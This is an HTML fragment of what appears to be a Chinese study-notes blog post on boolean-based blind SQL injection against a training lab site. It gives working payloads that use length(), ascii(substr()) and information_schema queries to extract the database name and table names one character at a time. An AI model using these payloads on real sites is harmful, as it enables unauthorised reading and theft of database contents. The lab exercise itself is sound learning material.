        <p>猜解当前数据库名称长度：</p>
<p>长度是12</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://inject2b.lab.aqlab.cn/Pass-10/index.php?id=1 and length(database())&gt;12</span><br><span class="line">http://inject2b.lab.aqlab.cn/Pass-10/index.php?id=1 and length(database())=12</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">猜解当前数据库名称：</span><br><span class="line">返回正常，说明数据库名称第一位是k</span><br><span class="line">http://inject2b.lab.aqlab.cn/Pass-10/index.php?id=1 and ascii(substr(database(),1,1))=107</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><img src="/2021/12/02/4.4%E7%9B%B2%E6%B3%A8/image-20211202235045994.png" alt="image-20211202235045994"></p>
<p>问题：length的作用？</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6 返回正常，说明当前数据库第一个表长度是6</span><br><span class="line"></span><br><span class="line">and substr((select table_name from information_schema.tables where table_schema=&#x27;kanwolongxia&#x27; limit 0,1),1,1)=&#x27;l&#x27; 返回正常，说明数据库表名的第一个的第一位是l</span><br></pre></td></tr></table></figure>
